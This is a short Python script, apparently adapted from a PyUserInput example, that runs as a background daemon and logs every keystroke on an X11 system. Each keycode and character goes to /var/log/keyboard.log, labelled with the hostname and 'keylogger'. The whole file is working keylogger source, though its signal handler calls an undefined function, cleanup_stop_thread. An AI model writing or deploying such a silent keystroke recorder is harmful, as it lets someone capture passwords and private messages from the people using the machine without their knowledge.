#!/usr/bin/env python3

# Modify from PyUserInput/examples/mouse.py

import daemon                               # python-daemon
from pykeyboard import PyKeyboardEvent      # PyUserInput (need python3-xlib for X11)

import logging
import sys
from socket import gethostname
from signal import signal, SIGINT


class KeyboardLoggingEvent(PyKeyboardEvent):
    def __init__(self):
        super().__init__()
        FORMAT = '%(asctime)-15s ' + gethostname() + ' keylogger %(levelname)s %(message)s'
        logging.basicConfig(filename='/var/log/keyboard.log', level=logging.DEBUG, format=FORMAT)

    def tap(self, keycode, character, press):
        TEMPLATE = '{{ "event": "key", "keycode": {}, "character": "{}", "press": {} }}'
        logging.info(TEMPLATE.format(keycode, character, press))


def main():

    with daemon.DaemonContext():

        ########################################
        # Setting Signal Handler For SIGINT
        ########################################

        def stop(signum, frame):
            cleanup_stop_thread()
            sys.exit()

        signal(SIGINT, stop)

        ########################################

        e = KeyboardLoggingEvent()
        e.capture = False
        e.daemon = False
        e.start()

        ########################################

        try:
            e.join()
        except KeyboardInterrupt:
            e.stop()
            sys.exit()


if __name__ == '__main__':
    main()
